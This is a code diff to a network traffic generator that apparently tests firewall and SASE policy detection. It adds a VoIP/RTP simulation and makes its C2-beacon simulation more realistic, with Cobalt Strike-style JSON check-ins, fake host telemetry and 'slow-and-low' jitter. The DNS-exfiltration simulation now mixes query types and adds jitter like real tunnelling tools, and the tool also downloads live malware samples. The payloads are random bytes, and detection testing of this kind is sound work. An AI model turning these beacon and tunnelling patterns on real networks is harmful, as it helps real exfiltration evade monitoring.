@@ -28,6 +28,7 @@ import time
 import base64
 import signal
 import socket
+import struct
 import random
 import threading
 import argparse
@@ -160,8 +161,8 @@ _SUITE_DESCRIPTIONS: list[tuple[str, str]] = [
     ("ads",              "HEAD requests to ad-tracker / analytics endpoints"),
     ("ai-browse",        "HEAD requests to AI/LLM service endpoints for URL-filter validation"),
     ("bgp",              "GoBGP peering session with configured neighbors"),
-    ("bigfile",          "5 GB HTTP download (bandwidth saturation)"),
-    ("c2-beacon",        "C2 beacon: periodic HTTP POSTs with malware UA and jitter"),
+    ("bigfile",          "Size-scaled HTTP download: S=100MB M=1GB L=2GB XL=5GB"),
+    ("c2-beacon",        "C2 beacon: rotating POST formats (form/JSON/raw), bimodal jitter"),
     ("llm-dlp",          "POST fake PII to LLM APIs; two-phase: API POSTs + browser endpoint HEAD requests"),
     ("crawl",            "Iterative web crawl from a configurable start URL"),
     ("dlp",              "DLP test file downloads over HTTPS"),
@@ -190,6 +191,7 @@ _SUITE_DESCRIPTIONS: list[tuple[str, str]] = [
     ("ssh",              "Non-interactive SSH connection attempts"),
     ("url-response",     "Measure HTTPS response times via requests library"),
     ("virus",            "Download known-virus samples (to /dev/null)"),
+    ("voip",             "VoIP/video: STUN requests + UCaaS signaling + RTP media packets"),
     ("web-scanner",      "Nikto web vulnerability scan"),
     ("all",              "Run every suite above in random order"),
 ]
@@ -630,10 +632,19 @@ def bigfile() -> None:
     content to /dev/null.  Designed to generate sustained high-bandwidth
     traffic and trigger bandwidth-based policy rules.
     """
-    url = "http://ipv4.download.thinkbroadband.com/5GB.zip"
-    ui_banner("Big-file Download", f"5 GB ZIP: {url}")
+    # Scale file size with --size: S=100MB, M=1GB, L=2GB, XL=5GB
+    _BIGFILE_URLS = {
+        "S":  "http://ipv4.download.thinkbroadband.com/100MB.zip",
+        "M":  "http://ipv4.download.thinkbroadband.com/1GB.zip",
+        "L":  "http://ipv4.download.thinkbroadband.com/2GB.zip",
+        "XL": "http://ipv4.download.thinkbroadband.com/5GB.zip",
+    }
+    url = _BIGFILE_URLS.get(ARGS.size, _BIGFILE_URLS["M"])
+    ua  = random.choice(user_agents)
+    ui_banner("Big-file Download", f"{ARGS.size} → {url}")
     try:
-        with requests.get(url, stream=True, verify=False, timeout=(5, 30)) as resp:
+        with requests.get(url, stream=True, verify=False, timeout=(5, 30),
+                          headers={"User-Agent": ua}) as resp:
             resp.raise_for_status()
             total = int(resp.headers.get("content-length", 0))
             with Progress(
@@ -1219,8 +1230,10 @@ def urlresponse_random() -> None:
             task = prog.add_task("resp", total=n)
             for i, url in enumerate(https_endpoints[:n], 1):
                 try:
-                    r = requests.get(url, timeout=3, verify=False)
-                    t = r.elapsed.total_seconds()
+                    ua = random.choice(user_agents)
+                    r  = requests.get(url, timeout=3, verify=False,
+                                      headers={"User-Agent": ua})
+                    t  = r.elapsed.total_seconds()
                     console.log(f"({i}/{n}) {url}  {t:.3f}s")
                     _stats.record(str(r.status_code))
                 except Exception:
@@ -1289,7 +1302,9 @@ def malware_download() -> None:
         random.shuffle(malware_files)
         for i, url in enumerate(malware_files[:n], 1):
             try:
-                status = _curl_download(url, rate_limit="3M", connect_timeout=4, timeout=20)
+                ua     = random.choice(malware_user_agents)
+                status = _curl_download(url, rate_limit="3M", connect_timeout=4,
+                                        timeout=20, user_agent=ua)
                 console.log(f"malware-dl ({i}/{n}) {url}  [{_status_style(status)}]HTTP {status}[/]")
                 _stats.record(status)
             except Exception as e:
@@ -1542,7 +1557,7 @@ def c2_beacon() -> None:
     """
     beacons = _size_to_limits(ARGS.size, 3, 5, 10, 20)
     ui_banner("C2 Beacon Simulation",
-              f"{beacons} POSTs with jitter  (1–5 s between each)")
+              f"{beacons} POSTs — rotating formats, bimodal jitter")
     try:
         with Progress(
             SpinnerColumn(), TextColumn("[cyan]C2[/]"),
@@ -1551,27 +1566,83 @@ def c2_beacon() -> None:
         ) as prog:
             task = prog.add_task("c2", total=beacons)
             for i in range(1, beacons + 1):
-                target = random.choice(c2_beacon_targets)
-                ua     = random.choice(malware_user_agents)
-                # Encode random bytes as the fake "check-in" payload.
-                payload = base64.b64encode(os.urandom(48)).decode()
-                jitter  = random.uniform(1, 5)
+                target     = random.choice(c2_beacon_targets)
+                ua         = random.choice(malware_user_agents)
+                session_id = base64.b64encode(os.urandom(12)).decode().rstrip("=")
+                payload    = base64.b64encode(os.urandom(48)).decode()
+                fmt        = random.randint(0, 2)
+
+                # Format 0 — form-encoded flat dict (generic RAT check-in)
+                # Format 1 — JSON with nested host telemetry (Cobalt Strike-style)
+                # Format 2 — raw base64 body (mimics encrypted implant check-in)
+                if fmt == 0:
+                    post_kwargs = dict(
+                        data={"id": session_id, "data": payload,
+                              "t": str(int(time.time()))},
+                        headers={
+                            "User-Agent": ua,
+                            "Content-Type": "application/x-www-form-urlencoded",
+                            "Cache-Control": "no-cache",
+                            "Accept": "*/*",
+                            "Connection": "keep-alive",
+                        },
+                    )
+                    fmt_label = "form"
+                elif fmt == 1:
+                    hostname = f"DESKTOP-{session_id[:6].upper()}"
+                    post_kwargs = dict(
+                        json={
+                            "uuid": session_id,
+                            "computer": hostname,
+                            "user": random.choice(["admin", "user", "jsmith",
+                                                   "administrator", "svc_account"]),
+                            "pid": random.randint(1000, 9999),
+                            "arch": random.choice(["x86", "x64", "arm64"]),
+                            "os": random.choice(["Windows 11", "Windows 10",
+                                                 "Ubuntu 22.04", "macOS 14"]),
+                            "payload": payload,
+                        },
+                        headers={
+                            "User-Agent": ua,
+                            "Content-Type": "application/json",
+                            "Accept": "application/json, */*",
+                            "X-Request-ID": base64.b64encode(
+                                os.urandom(8)).decode().rstrip("="),
+                            "Cache-Control": "no-store",
+                        },
+                    )
+                    fmt_label = "json"
+                else:
+                    post_kwargs = dict(
+                        data=payload.encode(),
+                        headers={
+                            "User-Agent": ua,
+                            "Content-Type": "application/octet-stream",
+                            "Accept": "*/*",
+                            "Connection": "keep-alive",
+                            "X-Session": session_id,
+                        },
+                    )
+                    fmt_label = "raw"
+
+                # Bimodal jitter: 80% short (1–5 s), 20% slow-and-low (10–30 s)
+                jitter = (random.uniform(10, 30) if random.random() < 0.2
+                          else random.uniform(1, 5))
                 console.log(
-                    f"C2 ({i}/{beacons}) POST → {target}  "
+                    f"C2 ({i}/{beacons}) POST/{fmt_label} → {target}  "
                     f"jitter={jitter:.1f}s  ua={ua[:40]}"
                 )
                 try:
                     resp = requests.post(
                         target,
-                        data={"id": payload[:16], "data": payload},
-                        headers={"User-Agent": ua},
                         timeout=4,
                         verify=False,
                         allow_redirects=True,
+                        **post_kwargs,
                     )
                     _stats.record(str(resp.status_code))
                 except Exception:
-                    _stats.fail()  # Unreachable targets are expected / normal
+                    _stats.fail()
                 time.sleep(jitter)
                 prog.update(task, advance=1)
         ui_ok("C2 beacon simulation complete")
@@ -1598,6 +1669,9 @@ def dns_exfil() -> None:
     try:
         resolver = random.choice(dns_endpoints[:4])  # Use well-known public resolvers
 
+        # Mix query types like real DNS tunnellers (iodine uses TXT+NULL, dnscat2 uses TXT+CNAME)
+        _EXFIL_QTYPES = ["TXT"] * 6 + ["A"] * 2 + ["MX"] * 2
+
         with Progress(
             SpinnerColumn(), TextColumn("[cyan]DNS-EXFIL[/]"),
             MofNCompleteColumn(), BarColumn(), TimeElapsedColumn(),
@@ -1606,18 +1680,20 @@ def dns_exfil() -> None:
             task = prog.add_task("exfil", total=n)
             for i in range(1, n + 1):
                 domain = random.choice(dns_exfil_domains)
-                # Vary chunk size per query to mimic real tunnelling fragmentation.
+                qtype  = random.choice(_EXFIL_QTYPES)
+                # Larger chunks (up to 40 bytes) produce longer high-entropy
+                # subdomain labels — stronger anomaly signal for DNS analytics.
                 chunk  = base64.b32encode(
-                    os.urandom(random.randint(12, 28))
+                    os.urandom(random.randint(16, 40))
                 ).decode().lower().rstrip("=")
                 query  = f"{chunk}.{domain}"
                 console.log(
-                    f"DNS-exfil ({i}/{n}) TXT {query[:55]}{'…' if len(query) > 55 else ''}"
+                    f"DNS-exfil ({i}/{n}) {qtype} {query[:60]}{'…' if len(query) > 60 else ''}"
                     f"  @{resolver}"
                 )
                 try:
                     subprocess.run(
-                        ["dig", "TXT", query, f"@{resolver}",
+                        ["dig", qtype, query, f"@{resolver}",
                          "+short", "+time=1", "+tries=1"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         timeout=5,
@@ -1628,6 +1704,9 @@ def dns_exfil() -> None:
                     _stats.fail()
                 finally:
                     prog.update(task, advance=1)
+                # Inter-query jitter (0.3–2 s) mimics real tunnelling tools and
+                # avoids rate-limit suppression that hides the exfil pattern.
+                time.sleep(random.uniform(0.3, 2.0))
         ui_ok("DNS exfil simulation complete")
     except Exception as e:
         ui_error(f"[dns_exfil] {e}")
@@ -2005,7 +2084,9 @@ def _download_domain_list(url: str, local_path: str) -> bool:
     """
     console.log(f"Downloading {url} → {local_path}")
     try:
-        with requests.get(url, stream=True, verify=False, timeout=10) as resp:
+        ua = random.choice(user_agents)
+        with requests.get(url, stream=True, verify=False, timeout=10,
+                          headers={"User-Agent": ua}) as resp:
             resp.raise_for_status()
             with open(local_path, "wb") as fh:
                 for chunk in resp.iter_content(chunk_size=8192):
@@ -2040,7 +2121,9 @@ def _probe_domain_list(local_path: str, n: int = 10) -> None:
         for i, domain in enumerate(sample, 1):
             url = f"https://{domain}"
             try:
-                r = requests.get(url, timeout=1, verify=False, allow_redirects=True)
+                ua = random.choice(user_agents)
+                r  = requests.get(url, timeout=1, verify=False, allow_redirects=True,
+                                  headers={"User-Agent": ua})
                 console.log(f"({i}/{len(sample)}) {url}  →  {r.status_code}")
                 _stats.record(str(r.status_code))
             except Exception as e:
@@ -2110,7 +2193,8 @@ def replace_all_endpoints(url: str) -> None:
     """
     import ast
     console.log(f"Replacing endpoints.py from: {url}")
-    data = urllib.request.urlopen(url, timeout=15).read()
+    req  = urllib.request.Request(url, headers={"User-Agent": random.choice(user_agents)})
+    data = urllib.request.urlopen(req, timeout=15).read()
     src = data.decode("utf-8")
     try:
         ast.parse(src)
@@ -2197,6 +2281,117 @@ def scrape_iterative(base_url: str, iterations: int = 3) -> None:
 
 
 # ══════════════════════════════════════════════════════════════════════════════
+# VOIP / VIDEO SIMULATION
+# ══════════════════════════════════════════════════════════════════════════════
+
+def voip_video_sim() -> None:
+    """
+    Simulate VoIP and video call traffic to trigger application-identification
+    on NGFWs and SASE platforms (Cato Networks, Prisma Access, Palo Alto, etc.).
+
+    Three phases with deliberate pacing so traffic looks like a real call session
+    rather than a burst scan:
+
+      1. STUN Binding Requests  — raw UDP to public STUN servers.  The STUN
+         magic cookie (0x2112A442) in the Binding Request is the primary signal
+         app-ID engines use to classify WebRTC, Zoom, Teams, and generic VoIP.
+
+      2. UCaaS signaling  — HTTPS GET to meeting/calling APIs (Zoom, Teams,
+         WebEx, Google Meet, Slack, RingCentral, Discord, WhatsApp, etc.).
+         URL-category databases identify these hostnames as "voice/video" and
+         "conferencing", triggering the relevant app-awareness policy hit.
+
+      3. RTP media simulation  — small UDP bursts with valid RTP headers
+         (V=2, payload type PCMU/PCMA audio or H.264/H.265 video) sent to
+         STUN server IPs on standard media ports.  Triggers RTP/SRTP app-
+         classification rules without establishing a real media session.
+         Random 0.2–0.8 s gaps between packets mimic inter-packet timing
+         of a real audio codec at 20–50 ms packetisation intervals.
+    """
+    n_stun = _size_to_limits(ARGS.size, 3,  5, 10, 15)
+    n_sig  = _size_to_limits(ARGS.size, 5, 10, 20, 30)
+    n_rtp  = _size_to_limits(ARGS.size, 4,  8, 16, 24)
+    ui_banner("VoIP / Video Simulation",
+              f"STUN×{n_stun}  UCaaS-signaling×{n_sig}  RTP-media×{n_rtp}")
+    try:
+        # ── Phase 1: STUN Binding Requests ────────────────────────────────────
+        console.log("[cyan]Phase 1:[/] STUN Binding Requests (UDP/3478)")
+        stun_pool = random.sample(stun_servers, min(n_stun, len(stun_servers)))
+        for host, port in stun_pool:
+            tx_id = os.urandom(12)
+            # RFC 5389 §6 — Binding Request: type=0x0001, length=0, magic cookie
+            pkt = struct.pack(">HHI", 0x0001, 0, 0x2112A442) + tx_id
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            try:
+                sock.settimeout(2)
+                sock.sendto(pkt, (host, port))
+                resp = sock.recv(1024)
+                _stats.ok()
+                console.log(f"STUN {host}:{port} → {len(resp)}B response")
+            except Exception as e:
+                _stats.fail()
+                console.log(f"[yellow]STUN {host}:{port} → {e.__class__.__name__}[/]")
+            finally:
+                sock.close()
+            time.sleep(random.uniform(0.3, 1.0))
+
+        # ── Phase 2: UCaaS signaling ───────────────────────────────────────────
+        console.log("[cyan]Phase 2:[/] UCaaS signaling (HTTPS)")
+        sig_pool = random.sample(ucaas_endpoints, min(n_sig, len(ucaas_endpoints)))
+        for i, url in enumerate(sig_pool, 1):
+            try:
+                ua = random.choice(user_agents)
+                r  = requests.get(url, timeout=4, verify=False,
+                                  headers={"User-Agent": ua})
+                _stats.record(str(r.status_code))
+                console.log(
+                    f"UCaaS ({i}/{len(sig_pool)}) {url}  "
+                    f"[{_status_style(str(r.status_code))}]{r.status_code}[/]"
+                )
+            except Exception as e:
+                _stats.fail()
+                console.log(f"[yellow]UCaaS ({i}/{len(sig_pool)}) {url}  {e.__class__.__name__}[/]")
+            time.sleep(random.uniform(0.5, 1.5))
+
+        # ── Phase 3: RTP media packets ─────────────────────────────────────────
+        console.log("[cyan]Phase 3:[/] RTP media simulation (UDP)")
+        ssrc      = int.from_bytes(os.urandom(4), "big")
+        seq       = random.randint(0, 65535)
+        timestamp = random.randint(0, 2**32 - 1)
+        _PT_NAMES = {0: "PCMU", 8: "PCMA", 96: "H.264", 97: "H.265"}
+        for i in range(1, n_rtp + 1):
+            host, _ = random.choice(stun_servers)
+            port    = random.choice([5004, 5005, 16384, 16385, 49152, 49153])
+            pt      = random.choice([0, 8, 96, 97])
+            # RFC 3550 §5.1 RTP header: V=2 P=0 X=0 CC=0 M=0 PT=pt
+            hdr     = struct.pack(">BBHII", 0x80, pt, seq & 0xFFFF,
+                                  timestamp & 0xFFFFFFFF, ssrc)
+            payload = os.urandom(random.randint(160, 1024))
+            pkt     = hdr + payload
+            sock    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            try:
+                sock.settimeout(1)
+                sock.sendto(pkt, (host, port))
+                _stats.ok()
+                console.log(
+                    f"RTP ({i}/{n_rtp}) PT={_PT_NAMES.get(pt, pt)} "
+                    f"seq={seq} → {host}:{port}  {len(pkt)}B"
+                )
+            except Exception as e:
+                _stats.fail()
+                console.log(f"[yellow]RTP ({i}/{n_rtp}) → {host}:{port}  {e.__class__.__name__}[/]")
+            finally:
+                sock.close()
+            seq       += 1
+            timestamp += random.randint(160, 960)   # ~20-120 ms at 8 kHz
+            time.sleep(random.uniform(0.2, 0.8))
+
+        ui_ok("VoIP / video simulation complete")
+    except Exception as e:
+        ui_error(f"[voip_video_sim] {e}")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
 # CLI & RUNNER
 # ══════════════════════════════════════════════════════════════════════════════
 
@@ -2235,6 +2430,7 @@ _SUITE_MAP: dict[str, list] = {
     "ssh":              [ssh_random],
     "url-response":     [urlresponse_random],
     "virus":            [virus_sim],
+    "voip":             [voip_video_sim],
     "web-scanner":      [web_scanner],
 }
 
